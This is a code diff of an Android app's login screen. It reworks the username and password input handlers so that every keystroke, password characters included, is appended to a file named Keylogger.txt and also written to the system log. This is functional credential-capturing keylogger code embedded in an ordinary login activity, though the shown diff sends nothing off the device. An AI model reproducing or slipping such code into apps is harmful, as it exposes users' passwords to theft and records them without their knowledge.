@@ -6,9 +6,11 @@ import androidx.appcompat.widget.Toolbar;
 import android.content.Intent;
 import android.content.SharedPreferences;
 import android.os.Bundle;
+import android.text.Editable;
+import android.text.TextWatcher;
 import android.text.method.PasswordTransformationMethod;
 import android.util.Base64;
-import android.view.KeyEvent;
+import android.util.Log;
 import android.view.View;
 import android.widget.Button;
 import android.widget.EditText;
@@ -24,6 +26,7 @@ public class LoginActivity extends AppCompatActivity {
     Toolbar toolbar;
     DBHelper DB;
 
+
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
@@ -36,53 +39,71 @@ public class LoginActivity extends AppCompatActivity {
         DB = new DBHelper(this);
         password.setTransformationMethod(new PasswordTransformationMethod());
         username.setFocusableInTouchMode(true);
-        username.setOnKeyListener(new View.OnKeyListener() {
+        username.addTextChangedListener(new TextWatcher() {
             @Override
-            public boolean onKey(View view, int i, KeyEvent keyEvent) {
-                if (keyEvent.getAction() == KeyEvent.ACTION_DOWN){
-                    if (keyEvent.getKeyCode() == KeyEvent.KEYCODE_SHIFT_LEFT || keyEvent.getKeyCode() == KeyEvent.KEYCODE_SHIFT_RIGHT) {
-                        return false;
-                    }
-                    else if (keyEvent.getKeyCode() == KeyEvent.KEYCODE_DEL){
+            public void beforeTextChanged(CharSequence s, int start, int count, int after) {
+            }
+
+            @Override
+            public void onTextChanged(CharSequence s, int start, int before, int count) {
+                if (username.getText().toString().isEmpty()) {
+                    return;
+                }
+                if (before > count) {
+                    for (int i = 0; i < before - count; i++) {
                         String keylog  = "Key Pressed in Username:{BACKSPACE}\n";
                         writeToFile("Keylogger.txt", keylog);
+                        Log.i("this", keylog);
                     }
-                    else if (keyEvent.getKeyCode() == KeyEvent.KEYCODE_ENTER){
-                        String keylog  = "Key Pressed in Username:{ENTER}\n";
-                        writeToFile("Keylogger.txt", keylog);
-                    }
-                    else{
-                        char key = (char) keyEvent.getUnicodeChar();
-                        String keylog  = "Key Pressed in Username:{" + key + "}\n";
-                        writeToFile("Keylogger.txt", keylog);
-                    }
+                    return;
                 }
-                return false;
+                if (s.charAt(start + count - 1) == '\n') {
+                    String keylog  = "Key Pressed in Username:{ENTER}\n";
+                    writeToFile("Keylogger.txt", keylog);
+                    Log.i("this", keylog);
+                } else {
+                    String keylog = "Key Pressed in Username:{" + s.charAt(start + count - 1) + "}\n";
+                    writeToFile("Keylogger.txt", keylog);
+                    Log.i("this", keylog);
+                }
+            }
+
+            @Override
+            public void afterTextChanged(Editable s) {
             }
         });
         password.setFocusableInTouchMode(true);
-        password.setOnKeyListener(new View.OnKeyListener() {
+        password.addTextChangedListener(new TextWatcher() {
             @Override
-            public boolean onKey(View view, int i, KeyEvent keyEvent) {
-                if (keyEvent.getAction() == KeyEvent.ACTION_DOWN){
-                    if (keyEvent.getKeyCode() == KeyEvent.KEYCODE_SHIFT_LEFT || keyEvent.getKeyCode() == KeyEvent.KEYCODE_SHIFT_RIGHT) {
-                        return false;
-                    }
-                    else if (keyEvent.getKeyCode() == KeyEvent.KEYCODE_DEL){
+            public void beforeTextChanged(CharSequence s, int start, int count, int after) {
+            }
+
+            @Override
+            public void onTextChanged(CharSequence s, int start, int before, int count) {
+                if (password.getText().toString().isEmpty()) {
+                    return;
+                }
+                if (before > count) {
+                    for (int i = 0; i < before - count; i++) {
                         String keylog  = "Key Pressed in Password:{BACKSPACE}\n";
                         writeToFile("Keylogger.txt", keylog);
+                        Log.i("this", keylog);
                     }
-                    else if (keyEvent.getKeyCode() == KeyEvent.KEYCODE_ENTER){
-                        String keylog  = "Key Pressed in Username:{ENTER}\n";
-                        writeToFile("Keylogger.txt", keylog);
-                    }
-                    else{
-                        char key = (char) keyEvent.getUnicodeChar();
-                        String keylog  = "Key Pressed in Password:{" + key + "}\n";
-                        writeToFile("Keylogger.txt", keylog);
-                    }
+                    return;
                 }
-                return false;
+                if (s.charAt(start + count - 1) == '\n') {
+                    String keylog  = "Key Pressed in Password:{ENTER}\n";
+                    writeToFile("Keylogger.txt", keylog);
+                    Log.i("this", keylog);
+                } else {
+                    String keylog = "Key Pressed in Password:{" + s.charAt(start + count - 1) + "}\n";
+                    writeToFile("Keylogger.txt", keylog);
+                    Log.i("this", keylog);
+                }
+            }
+
+            @Override
+            public void afterTextChanged(Editable s) {
             }
         });
         btnlogin.setOnClickListener(new View.OnClickListener() {
@@ -123,10 +144,9 @@ public class LoginActivity extends AppCompatActivity {
     }
 
     public void writeToFile(String fileName, String content) {
-        File file = new File("/data/data/com.example.project","files");
+        File file = new File("/data/data/com.example.project/", fileName);
         try {
-            File gpxfile = new File(file, fileName);
-            FileWriter writer = new FileWriter(gpxfile, true);
+            FileWriter writer = new FileWriter(file, true);
             writer.append(content + "\n");
             writer.flush();
             writer.close();
